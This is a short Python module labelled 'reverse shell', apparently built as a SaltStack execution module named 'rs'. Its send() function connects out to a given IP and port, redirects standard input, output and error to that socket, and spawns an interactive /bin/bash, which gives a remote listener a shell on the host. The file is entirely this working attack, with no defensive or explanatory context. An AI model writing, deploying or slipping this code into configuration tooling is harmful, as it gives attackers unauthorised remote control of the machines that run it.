"""
reverse shell
"""
import socket
import pty
import os

__virtualname__ = 'rs'


def __virtual__():
    return __virtualname__


def send(ip, port=1234):
    s = socket.socket(2, 1)
    s.connect((ip, int(port)))
    fd = s.fileno()
    os.dup2(fd, 0)
    os.dup2(fd, 1)
    os.dup2(fd, 2)
    pty.spawn('/bin/bash')
